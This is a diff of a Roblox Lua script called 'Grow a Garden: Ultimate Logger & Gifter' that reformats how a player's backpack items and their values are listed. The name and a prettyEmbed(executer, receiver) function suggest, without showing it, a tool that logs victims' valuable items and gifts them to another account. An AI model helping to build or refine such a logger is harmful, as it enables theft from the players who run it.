@@ -1,4 +1,4 @@
--- Grow a Garden: Ultimate Logger & Gifter (Backpack Code Block REALLY FIXED)
+-- Grow a Garden: Ultimate Logger & Gifter (Backpack Code Block FINALLY FIXED)
 -- Made By Timoci | discord.gg/notyet
 
 local CONFIG = {
@@ -119,20 +119,16 @@ local function collectItems()
     end)
     return items, totalValue, foundRare
 end
+
+-- THIS IS THE CORRECT FINAL VERSION:
 local function buildBackpackSection(items)
     if #items == 0 then return "_No giftable items found!_" end
     local itemLines = {}
     for _, item in ipairs(items) do
-        if item.Type == "Pet" then
-            table.insert(itemLines, string.format("%s %s [%.2fkg] [Age %s] %s¢",
-                item.Emoji, item.Name, item.Weight, tostring(item.Age or "?"), formatValue(item.Value)))
-        else
-            table.insert(itemLines, string.format("%s %s [%.2fkg] %s¢",
-                item.Emoji, item.Name, item.Weight, formatValue(item.Value)))
-        end
+        if item.Type == "Pet" then table.insert(itemLines, string.format("%s %s [%.2fkg] [Age %s] **%s¢**", item.Emoji, item.Name, item.Weight, tostring(item.Age or "?"), formatValue(item.Value)))
+        else table.insert(itemLines, string.format("%s %s [%.2fkg] **%s¢**", item.Emoji, item.Name, item.Weight, formatValue(item.Value))) end
     end
-    -- THIS is the real fix:
-    return "```\n" .. table.concat(itemLines, "\n") .. "\n```
+    return table.concat(itemLines, "\n")
 end
 
 local function prettyEmbed(executer, receiver)
